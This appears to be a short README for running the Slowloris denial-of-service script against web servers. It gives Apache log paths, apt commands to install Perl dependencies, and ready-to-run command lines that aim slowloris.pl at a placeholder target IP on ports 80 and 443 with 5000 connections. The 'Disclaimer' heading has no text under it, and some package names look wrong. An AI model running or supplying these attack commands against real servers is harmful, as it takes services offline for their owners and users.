# Disclaimer

Log Web Server Apache :
------
```
/var/log/apache2/tail -f ./access.log
/var/log/apache2/access.log
```

Requirements:
------
```
sudo apt-get update  
sudo apt-get install perl
sudo apt-get install libwww-mechanize-shell-perl
sudo apt-get install perl-mechanize
```

Example Configuration :
-----
```
cd /thePathToYourSlowloris.plFile
./slowloris.pl
HTTP -> perl slowloris.pl -dns [IP_TARGET] -port 80 -timeout 200 -num 5000 -cache
HTTPS -> perl slowloris.pl -dns [IP_TARGET] -port 443 -timeout 200 -num 5000 -cache
```
